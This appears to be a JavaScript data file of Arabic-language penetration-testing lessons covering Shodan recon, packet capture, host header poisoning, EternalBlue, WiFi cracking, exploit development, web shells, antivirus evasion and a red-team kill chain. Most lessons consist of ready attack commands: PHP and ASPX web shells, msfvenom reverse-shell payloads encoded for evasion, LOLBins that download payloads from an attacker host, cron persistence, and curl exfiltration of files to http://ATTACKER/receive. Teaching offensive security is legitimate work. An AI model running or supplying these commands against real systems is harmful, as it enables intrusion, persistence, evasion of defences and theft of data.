  id:79, title:"استخدام Shodan بفعالية", icon:"🌐", level:"intermediate", cat:"recon",
  tags:["Shodan","OSINT","IoT","Attack Surface"],
  desc:"إتقان Shodan لاكتشاف البنية التحتية وإيجاد الأجهزة المكشوفة.",
  steps:[
    { title:"أساسيات Shodan", text:"Shodan يفهرس الأجهزة المتصلة بالإنترنت.", cmd:"pip3 install shodan\nshodan init YOUR_API_KEY\nshodan host 8.8.8.8", cmdDesc:"البدء مع Shodan" },
    { title:"Shodan Dorks", text:"استعلامات متقدمة للبحث الدقيق.", cmd:"shodan search 'org:TargetCompany'\nshodan search 'port:22 country:SA'\nshodan search 'product:Apache version:2.4.49'", cmdDesc:"Shodan Dorks" },
    { title:"فحص Attack Surface", text:"اكتشاف كل أصول الشركة المكشوفة.", cmd:"shodan domain target.com\nshodan search 'ssl:target.com'\nshodan count 'org:TargetCompany'", cmdDesc:"تحليل Attack Surface" },
    { title:"تنبيهات Shodan", text:"تلقي إشعار عند ظهور IP جديد.", cmd:"shodan alert create 'TargetAlert' 'org:TargetCompany'\nshodan alert list", cmdDesc:"إعداد Shodan Alerts" }
  ]
},
{
  id:80, title:"تحليل حركة مرور الشبكة", icon:"📊", level:"intermediate", cat:"network",
  tags:["Network Analysis","tcpdump","tshark","PCAP"],
  desc:"تحليل حركة مرور الشبكة من سطر الأوامر.",
  steps:[
    { title:"tcpdump الأساسيات", text:"tcpdump من أقوى أدوات التقاط الحزم.", cmd:"tcpdump -i eth0 -w capture.pcap\ntcpdump -i eth0 port 80\ntcpdump -i eth0 host 192.168.1.10", cmdDesc:"التقاط الحزم بـ tcpdump" },
    { title:"tshark التحليل من CLI", text:"tshark نسخة سطر أوامر من Wireshark.", cmd:"tshark -r capture.pcap\ntshark -r capture.pcap -Y 'http.request'\ntshark -r capture.pcap -T fields -e ip.src -e ip.dst", cmdDesc:"تحليل بـ tshark" },
    { title:"استخراج بيانات من PCAP", text:"استخراج ملفات وبيانات من الحزم.", cmd:"tshark -r capture.pcap --export-objects http,files/\ntshark -r capture.pcap -Y 'ftp' -T fields -e ftp.request.command -e ftp.request.arg", cmdDesc:"استخراج بيانات من PCAP" },
    { title:"اكتشاف Anomalies", text:"البحث عن أنماط غير طبيعية.", cmd:"tshark -r capture.pcap -q -z 'conv,tcp'\ntshark -r capture.pcap -Y 'icmp' | wc -l", cmdDesc:"اكتشاف Anomalies في الشبكة" }
  ]
},
{
  id:81, title:"اختبار Open Redirect وHost Header", icon:"↩️", level:"intermediate", cat:"webapp",
  tags:["Open Redirect","Host Header","Cache Poisoning"],
  desc:"اكتشاف واستغلال Open Redirect وHost Header Injection.",
  steps:[
    { title:"Open Redirect", text:"إعادة توجيه لمواقع خارجية.", cmd:"curl -v 'http://target.com/redirect?url=http://evil.com'\ncurl -v 'http://target.com/login?next=//evil.com'", cmdDesc:"اختبار Open Redirect" },
    { title:"Host Header Injection", text:"تعديل Host header يؤثر على Password Reset.", cmd:"curl -H 'Host: evil.com' http://target.com/forgot-password", cmdDesc:"Host Header Injection" },
    { title:"Password Reset Poisoning", text:"سرقة رابط إعادة تعيين كلمة المرور.", cmd:"# في Burp Intercept:\n# POST /forgot-password\n# Host: evil.com\n# يرسل رابط Reset بـ: http://evil.com/reset?token=TOKEN", cmdDesc:"Password Reset Poisoning" },
    { title:"Cache Poisoning", text:"تسميم الـ Cache بـ Host Header خاطئ.", cmd:"curl -H 'Host: evil.com' -H 'X-Forwarded-Host: evil.com' http://target.com/", cmdDesc:"Web Cache Poisoning" }
  ]
},
{
  id:82, title:"اختبار أمان SMB وNetBIOS", icon:"🖧", level:"intermediate", cat:"network",
  tags:["SMB","NetBIOS","EternalBlue","Windows"],
  desc:"فحص خدمات SMB والبحث عن ثغرات Windows الشبكية.",
  steps:[
    { title:"فحص SMB بـ Nmap", text:"اكتشاف معلومات SMB والثغرات.", cmd:"nmap --script=smb-enum-shares -p 445 192.168.1.10\nnmap --script=smb-vuln-ms17-010 -p 445 192.168.1.10", cmdDesc:"فحص SMB الشامل" },
    { title:"Enum4Linux", text:"أداة متخصصة لـ Enumeration على SMB.", cmd:"enum4linux -a 192.168.1.10\nenum4linux -u '' -p '' 192.168.1.10", cmdDesc:"Enum4Linux" },
    { title:"EternalBlue MS17-010", text:"إحدى أخطر ثغرات Windows.", cmd:"use exploit/windows/smb/ms17_010_eternalblue\nset RHOSTS 192.168.1.10\nset PAYLOAD windows/x64/meterpreter/reverse_tcp\nrun", cmdDesc:"استغلال EternalBlue", note:"تؤثر على Windows 7 وServer 2008 غير المحدّثة." },
    { title:"CrackMapExec للـ Lateral Movement", text:"استخدام credentials مع CME.", cmd:"crackmapexec smb 192.168.1.0/24 -u admin -p password\ncrackmapexec smb 192.168.1.10 -u admin -p pass --shares", cmdDesc:"CME للتحرك الجانبي" }
  ]
},
{
  id:83, title:"اختبار أمان الراوتر والـ IoT", icon:"📡", level:"intermediate", cat:"network",
  tags:["Router","IoT","Default Credentials","Firmware"],
  desc:"فحص أمان أجهزة الراوتر والـ IoT.",
  steps:[
    { title:"اكتشاف أجهزة IoT", text:"Shodan وNmap لاكتشاف الأجهزة.", cmd:"shodan search 'port:554 camera'\nnmap -sV 192.168.1.0/24 --script=rtsp-url-brute", cmdDesc:"اكتشاف أجهزة IoT" },
    { title:"Credentials افتراضية", text:"معظم أجهزة IoT بـ credentials افتراضية.", cmd:"# أمثلة:\n# admin:admin\n# admin:password\n# root:root\n# 1234:1234", cmdDesc:"اختبار Credentials الافتراضية" },
    { title:"فحص Firmware", text:"تحليل Firmware لإيجاد backdoors.", cmd:"binwalk -e firmware.bin\nstrings firmware.bin | grep -i 'password\\|admin\\|backdoor'", cmdDesc:"تحليل IoT Firmware" },
    { title:"RTSP Camera Streams", text:"الكاميرات بـ RTSP بدون حماية.", cmd:"nmap --script=rtsp-url-brute -p 554 192.168.1.10\nvlc rtsp://admin:admin@192.168.1.10:554/live", cmdDesc:"الوصول لـ Camera Stream" }
  ]
},
{
  id:84, title:"مقدمة في Exploit Development", icon:"⚙️", level:"advanced", cat:"exploitation",
  tags:["Exploit Dev","ROP","pwntools","GDB"],
  desc:"أساسيات تطوير Exploits: ROP Chains وBypass الحمايات.",
  steps:[
    { title:"تجاوز ASLR وStack Canary", text:"ASLR عشوائية عناوين الذاكرة. Stack Canary يحمي من Buffer Overflow.", cmd:"# فحص الحمايات:\nchecksec ./binary\n# ASLR:\ncat /proc/sys/kernel/randomize_va_space\n# تعطيل ASLR (للتدريب):\necho 0 > /proc/sys/kernel/randomize_va_space", cmdDesc:"فحص وتعطيل الحمايات" },
    { title:"ROP Chains", text:"Return Oriented Programming لتجاوز NX/DEP.", cmd:"# إيجاد gadgets:\nROPgadget --binary ./binary | grep 'pop rdi'\nropper --file ./binary --search 'pop rdi'", cmdDesc:"البحث عن ROP Gadgets" },
    { title:"استخدام pwntools", text:"pwntools مكتبة Python لبناء Exploits.", cmd:"from pwn import *\np = process('./binary')\n# أو:\np = remote('target.com', 1337)\np.sendline(b'A' * 100 + p64(RET_ADDR))\np.interactive()", cmdDesc:"Exploit بـ pwntools" },
    { title:"Format String Vulnerability", text:"%x يقرأ من الـ stack مباشرة.", cmd:"# اختبار:\nprintf '%s %x %x %x %x'\n# إذا طبع الـ stack = ثغرة Format String", cmdDesc:"اكتشاف Format String" }
  ]
},
{
  id:85, title:"اختبار أمان تطبيقات Android", icon:"📱", level:"advanced", cat:"mobile",
  tags:["Android","APK","Frida","MobSF"],
  desc:"فحص تطبيقات Android: APK Analysis وTraffic Intercept.",
  steps:[
    { title:"تفكيك APK", text:"تحليل كود التطبيق.", cmd:"apktool d app.apk -o app_decoded\njadx -d app_java app.apk\ngrep -r 'password\\|api_key\\|secret' app_decoded/", cmdDesc:"تفكيك وتحليل APK" },
    { title:"MobSF للتحليل التلقائي", text:"MobSF يحلل APK تلقائياً.", cmd:"docker pull opensecurity/mobile-security-framework-mobsf\ndocker run -it -p 8000:8000 opensecurity/mobile-security-framework-mobsf\n# http://localhost:8000", cmdDesc:"تشغيل MobSF" },
    { title:"Frida للـ Dynamic Analysis", text:"Frida يتيح hooking وتعديل السلوك.", cmd:"pip3 install frida-tools\nfrida-ps -U\nfrida -U -n com.target.app -l script.js", cmdDesc:"Dynamic Analysis بـ Frida" },
    { title:"ADB للبيانات المحلية", text:"ADB يتيح الوصول لبيانات التطبيق.", cmd:"adb devices\nadb shell\nls /data/data/com.target.app/\nadb shell cat /data/data/com.target.app/shared_prefs/prefs.xml", cmdDesc:"فحص بيانات التطبيق المحلية" }
  ]
},
{
  id:86, title:"CTF - تقنيات التشفير والترميز", icon:"🔢", level:"intermediate", cat:"ctf",
  tags:["CTF","Cryptography","Encoding","Base64"],
  desc:"أساسيات فك التشفير والترميز في مسابقات CTF.",
  steps:[
    { title:"فك ترميز Base64 وHex", text:"الترميزات الشائعة في CTF.", cmd:"echo 'SGVsbG8=' | base64 -d\necho '48656c6c6f' | xxd -r -p\npython3 -c \"import base64; print(base64.b64decode('SGVsbG8='))\"", cmdDesc:"فك ترميز Base64 وHex" },
    { title:"Caesar Cipher وROT13", text:"أبسط تشفيرات الإزاحة.", cmd:"echo 'Hello' | tr 'A-Za-z' 'N-ZA-Mn-za-m'\n# أو: cyberchef أونلاين", cmdDesc:"ROT13 وCaesar" },
    { title:"تحليل تشفير XOR", text:"XOR شائع في CTF.", cmd:"python3 -c \"\ndata = bytes.fromhex('1a2b3c4d')\nkey = 0x41\nresult = bytes([b ^ key for b in data])\nprint(result)\n\"", cmdDesc:"فك تشفير XOR" },
    { title:"CyberChef وأدوات CTF", text:"CyberChef أداة أونلاين لكل العمليات.", cmd:"# CyberChef:\n# https://gchq.github.io/CyberChef\n# أدوات: Cipher Identifier, Hash Cracker\n# دفCTF 101:\nrsakey, rsactftool", cmdDesc:"أدوات CTF الأساسية" }
  ]
},
{
  id:87, title:"فحص أمان الشبكة اللاسلكية المتقدم", icon:"📶", level:"advanced", cat:"wireless",
  tags:["WPA3","WPS","PMKID","Aircrack"],
  desc:"هجمات متقدمة على WiFi: WPS وPMKID وWPA3.",
  steps:[
    { title:"WPS Attack", text:"WPS PIN قابل للكسر بسبب ضعف في التصميم.", cmd:"wash -i wlan0mon\nreaver -i wlan0mon -b BSSID -vv\nreaver -i wlan0mon -b BSSID -p PIN", cmdDesc:"WPS Brute Force بـ Reaver" },
    { title:"PMKID Attack الحديث", text:"PMKID لا يحتاج Deauth أو انتظار Client.", cmd:"hcxdumptool -o pmkid.pcapng -i wlan0mon --enable_status=1\nhcxpcapngtool -o hashes.hc22000 pmkid.pcapng\nhashcat -m 22000 hashes.hc22000 rockyou.txt", cmdDesc:"PMKID Modern Attack" },
    { title:"Aircrack-ng الكلاسيكي", text:"كسر WEP وWPA بالطريقة التقليدية.", cmd:"aircrack-ng -w /usr/share/wordlists/rockyou.txt -b BSSID handshake-01.cap", cmdDesc:"كسر WPA بـ Aircrack-ng" },
    { title:"WPA3 Dragonblood", text:"ثغرات في WPA3 SAE.", cmd:"git clone https://github.com/vanhoefm/dragonblood.git\ncd dragonblood\npython3 dragonforce.py -i wlan0mon -t TARGET_BSSID", cmdDesc:"اختبار ثغرات WPA3" }
  ]
},
{
  id:88, title:"تطوير Web Shells واستخدامها", icon:"🐚", level:"advanced", cat:"exploitation",
  tags:["Web Shell","PHP","ASPX","Persistence"],
  desc:"أنواع Web Shells وتقنيات الاستخدام والتهرب.",
  steps:[
    { title:"PHP Web Shell بسيط", text:"أبسط Web Shell PHP.", cmd:"echo '<?php system($_GET[cmd]); ?>' > shell.php\n# الاستخدام:\ncurl 'http://target.com/uploads/shell.php?cmd=id'", cmdDesc:"PHP Web Shell" },
    { title:"Web Shell متطور بمصادقة", text:"Shell مع حماية كلمة مرور.", cmd:"<?php\nif(isset($_POST['password']) && $_POST['password'] == 'secret123') {\n  system($_POST['cmd']);\n}\n?>", cmdDesc:"Web Shell مع مصادقة" },
    { title:"تجاوز فلاتر Upload", text:"تقنيات لتجاوز قيود رفع الملفات.", cmd:"# Double Extension: shell.php.jpg\n# Null Byte: shell.php%00.jpg\n# Content-Type Bypass في Burp\n# MIME Type: image/jpeg", cmdDesc:"تجاوز فلاتر File Upload" },
    { title:"ASPX وJSP Shells", text:"بدائل لأنظمة Windows وJava.", cmd:"# ASPX:\n<%@ Page Language='C#' %>\n<% Response.Write(System.Diagnostics.Process.Start('cmd','/c '+Request['cmd']).StandardOutput.ReadToEnd()); %>\n# حمّل بـ: shell.aspx", cmdDesc:"Web Shell على Windows" }
  ]
},
{
  id:89, title:"تقنيات تجنب الاكتشاف - AV Evasion", icon:"👻", level:"advanced", cat:"exploitation",
  tags:["AV Evasion","Obfuscation","AMSI","EDR"],
  desc:"تقنيات تجنب برامج الحماية وأنظمة الكشف.",
  steps:[
    { title:"Encoding بـ msfvenom", text:"Encoding يغير توقيع الـ Payload.", cmd:"msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -e x86/shikata_ga_nai -i 15 -f exe > encoded.exe", cmdDesc:"Encoding Payload" },
    { title:"Veil Framework", text:"Veil يولد payloads يتجاوز معظم AV.", cmd:"git clone https://github.com/Veil-Framework/Veil.git\ncd Veil && ./config/setup.sh\nveil", cmdDesc:"توليد Payload متهرب بـ Veil" },
    { title:"Shellter للـ Injection", text:"حقن Payload في EXE شرعي.", cmd:"apt install shellter\nshellter -a -f calc.exe\n# اختار A (Auto mode)\n# اختار Payload", cmdDesc:"Shellter للـ PE Injection" },
    { title:"Living off the Land", text:"استخدام أدوات Windows الأصلية.", cmd:"# LOLBins:\ncertutil.exe -decode encoded.b64 output.exe\nbitsadmin /transfer 'j' http://ATTACKER/payload.exe C:\\payload.exe\nregsvr32 /s /n /u /i:http://ATTACKER/script.sct scrobj.dll", cmdDesc:"LOLBins لتجنب الكشف" }
  ]
},
{
  id:90, title:"سيناريو اختبار كامل Red Team", icon:"🎭", level:"advanced", cat:"exploitation",
  tags:["Red Team","APT","Full Pentest","Kill Chain"],
  desc:"محاكاة هجوم APT كامل من البداية حتى النهاية.",
  steps:[
    { title:"Reconnaissance الخارجي", text:"جمع معلومات دون لمس الهدف.", cmd:"subfinder -d target.com\ntheHarvester -d target.com -b all\nshodan search 'org:TargetCompany'\namass enum -passive -d target.com", cmdDesc:"OSINT وReconnaissance" },
    { title:"Initial Access", text:"الحصول على موطئ قدم أول.", cmd:"# Phishing Email بـ GoPhish\n# Exploit على Service مكشوف:\nnmap -sV target.com\nsearchsploit SERVICE_VERSION", cmdDesc:"الحصول على Initial Access" },
    { title:"Persistence وLateral Movement", text:"تثبيت الوجود والتحرك داخلياً.", cmd:"# Persistence:\n(crontab -l; echo '@reboot /bin/bash -c ....') | crontab -\n# Lateral Movement:\ncrackmapexec smb NETWORK -u USER -p PASS\nimpacket-psexec USER:PASS@TARGET", cmdDesc:"Persistence وLateral Movement" },
    { title:"Exfiltration وReport", text:"استخراج البيانات وكتابة التقرير.", cmd:"# Exfiltration:\ncurl -F 'data=@sensitive.txt' http://ATTACKER/receive\n# تشفير:\ntar czf - sensitive_data/ | openssl enc -aes-256-cbc -out data.enc -k PASSWORD", cmdDesc:"Exfiltration والتوثيق", note:"وثّق كل خطوة. التقرير هو الدليل." }
  ]
}
];

// Merge with main TUTORIALS array if it exists
if (typeof TUTORIALS !== 'undefined') {
  window.TUTORIALS_PART2.forEach(lesson => {
    if (!TUTORIALS.find(t => t.id === lesson.id)) {
      TUTORIALS.push(lesson);
    }
  });
}
